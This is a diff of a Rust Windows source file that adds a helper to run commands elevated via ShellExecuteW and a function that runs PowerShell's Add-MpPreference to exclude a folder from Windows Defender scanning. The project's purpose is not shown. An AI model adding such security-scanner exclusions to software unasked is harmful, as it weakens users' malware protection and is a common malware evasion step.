@@ -1,135 +1,75 @@
-// use std::path::PathBuf;
-// use std::ptr::null_mut;
+use std::env;
+use std::ffi::OsString;
+use std::os::windows::ffi::OsStrExt;
+use winapi::um::shellapi::ShellExecuteW;
+use std::ptr;
+use std::fs::File;
+use std::io::Read;
 
-// use widestring::U16CString;
-// use winapi::um::errhandlingapi::GetLastError;
-// use winapi::um::shellapi::ShellExecuteW;
-// use winapi::um::winbase::CREATE_NO_WINDOW;
-// use winapi::um::winuser::SW_SHOWNORMAL;
+pub fn spawn_admin_process_and_get_output(command: &str, args: Vec<&str>) -> Result<String, String> {
+  let cwd = env::current_dir().expect("Failed to get current working directory");
+  let cwd_str = cwd.to_str().expect("Failed to convert path to string");
+  
+  let appdata = env::var("APPDATA").expect("Failed to get APPDATA environment variable");
+  let appdata: std::path::PathBuf = appdata.into();
+  let output_file: std::path::PathBuf = appdata.join("out");
+  let output_file_str = output_file.to_str().expect("Failed to convert output path to string");
 
-// use winapi::um::winnt::{HANDLE, TOKEN_QUERY};
-// use winapi::um::processthreadsapi::{OpenProcessToken, GetCurrentProcess, CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
-// use winapi::um::handleapi::CloseHandle;
+  let cwd_wide: Vec<u16> = OsString::from(cwd_str).encode_wide().chain(Some(0)).collect();
+  let verb_wide: Vec<u16> = OsString::from("runas").encode_wide().chain(Some(0)).collect();
+  let command_wide: Vec<u16> = OsString::from(command).encode_wide().chain(Some(0)).collect();
+  
+  let mut params = args.join(" ");
+  params.push_str(&format!(" > \"{}\"", output_file_str));
+  let params_wide: Vec<u16> = OsString::from(params).encode_wide().chain(Some(0)).collect();
+  
+  let result = unsafe {
+    ShellExecuteW(
+      ptr::null_mut(),
+      verb_wide.as_ptr(),
+      command_wide.as_ptr(),
+      params_wide.as_ptr(),
+      cwd_wide.as_ptr(),
+      0,
+    )
+  };
 
-// use winapi::um::securitybaseapi::GetTokenInformation;
+  if result as isize <= 32 {
+    return Err(format!("Failed to execute command"));
+  }
 
-// pub fn restart_as_admin(relaunch_args: &str) -> Result<(), String> {
-//     let exe_path = std::env::current_exe()
-//         .map_err(|e| format!("Failed to get current executable path: {}", e))?;
+  std::thread::sleep(std::time::Duration::from_millis(1500));
+  
+  let output_file = output_file.to_str().expect("Failed to convert output path to string");
+  let mut file = File::open(output_file).expect("Failed to open output file");
+  
+  let mut file_data: Vec<u8> = Vec::new();
+  file.read_to_end(&mut file_data).expect("Failed to read output file");
 
-//     let exe_path_wide = U16CString::from_str(exe_path.to_str().unwrap_or(""))
-//         .map_err(|e| format!("Failed to convert path to wide string: {}", e))?;
+  let mut wide_file_data: Vec<u16> = Vec::new();
+  for i in 0..file_data.len() / 2 {
+    let byte1 = file_data[i * 2];
+    let byte2 = file_data[i * 2 + 1];
+    let u16_val = (byte2 as u16) << 8 | byte1 as u16;
+    wide_file_data.push(u16_val);
+  }
 
-//     let args_wide = U16CString::from_str(relaunch_args)
-//         .map_err(|e| format!("Failed to convert relaunch args to wide string: {}", e))?;
+  let output = String::from_utf16(&wide_file_data).expect("Failed to convert output to string");
+  std::fs::remove_file(output_file).expect("Failed to delete output file");
 
-//     let operation_wide = U16CString::from_str("runas")
-//         .map_err(|e| format!("Failed to convert operation to wide string: {}", e))?;
+  Ok(output)
+}
 
-//     let result = unsafe {
-//         ShellExecuteW(
-//             null_mut(),
-//             operation_wide.as_ptr(),
-//             exe_path_wide.as_ptr(),
-//             args_wide.as_ptr(),
-//             null_mut(),
-//             SW_SHOWNORMAL,
-//         )
-//     };
+pub fn add_windows_defender_exclusions(folder_path: &str) -> Result<bool, String> {
+  let command = format!(
+    "Add-MpPreference -ExclusionPath \"{}\"; (Get-MpPreference).ExclusionPath",
+    folder_path
+  );
+  let output = spawn_admin_process_and_get_output("powershell", vec!["-Command", &command])?;
 
-//     if result as usize <= 32 {
-//         let error_code = unsafe { GetLastError() };
-//         return Err(format!("Failed to restart as admin: error code {}", error_code));
-//     }
+  if !output.contains(folder_path) {
+    return Err("Failed to add folder to defender exclusion list.".to_string());
+  }
 
-//     std::process::exit(0);
-// }
-
-// pub fn is_running_as_admin() -> Result<bool, String> {
-//     unsafe {
-//         let process_handle = GetCurrentProcess();
-//         if process_handle.is_null() {
-//             return Err("Failed to get current process handle".to_string());
-//         }
-
-//         let mut token_handle: HANDLE = null_mut();
-//         if OpenProcessToken(process_handle, TOKEN_QUERY, &mut token_handle) == 0 {
-//             return Err(format!(
-//                 "Failed to open process token: {}",
-//                 GetLastError()
-//             ));
-//         }
-
-//         let mut token_info_length: u32 = 0;
-//         GetTokenInformation(
-//             token_handle,
-//             winapi::um::winnt::TokenElevation,
-//             null_mut(),
-//             0,
-//             &mut token_info_length,
-//         );
-
-//         let mut elevation: winapi::um::winnt::TOKEN_ELEVATION = std::mem::zeroed();
-//         if GetTokenInformation(
-//             token_handle,
-//             winapi::um::winnt::TokenElevation,
-//             &mut elevation as *mut _ as *mut _,
-//             std::mem::size_of::<winapi::um::winnt::TOKEN_ELEVATION>() as u32,
-//             &mut token_info_length,
-//         ) == 0
-//         {
-//             let error_code = GetLastError();
-//             CloseHandle(token_handle);
-//             return Err(format!("Failed to get token information: {}", error_code));
-//         }
-
-//         CloseHandle(token_handle);
-
-//         Ok(elevation.TokenIsElevated != 0)
-//     }
-// }
-
-// pub fn add_to_defender_exclusion(path: &PathBuf) -> Result<(), String> {
-//     let powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string();
-//     let path_str = path.to_str().ok_or("Failed to convert path to string")?;
-
-//     let powershell_exe = U16CString::from_str(&powershell_path)
-//         .map_err(|e| format!("Failed to convert PowerShell path to wide string: {}", e))?;
-//     let command = format!(
-//         "\"{}\" Add-MpPreference -ExclusionPath '{}'",
-//         powershell_path,
-//         path_str
-//     );
-//     let command_wide = U16CString::from_str(&command)
-//         .map_err(|e| format!("Failed to convert command to wide string: {}", e))?;
-
-//     let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
-//     startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-//     let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
-
-//     let success = unsafe {
-//         CreateProcessW(
-//             powershell_exe.into_raw() as *mut u16,
-//             command_wide.into_raw() as *mut u16,
-//             null_mut(),
-//             null_mut(),
-//             0,
-//             CREATE_NO_WINDOW | winapi::um::winbase::DETACHED_PROCESS,
-//             null_mut(),
-//             null_mut(),
-//             &mut startup_info,
-//             &mut process_info,
-//         )
-//     };
-//     if success == 0 {
-//         let error_code = unsafe { GetLastError() };
-//         return Err(format!("Failed to create PowerShell process: {}", error_code));
-//     }
-
-//     unsafe {
-//         CloseHandle(process_info.hProcess);
-//         CloseHandle(process_info.hThread);
-//     }
-
-//     Ok(())
-// }
+  Ok(true)
+}
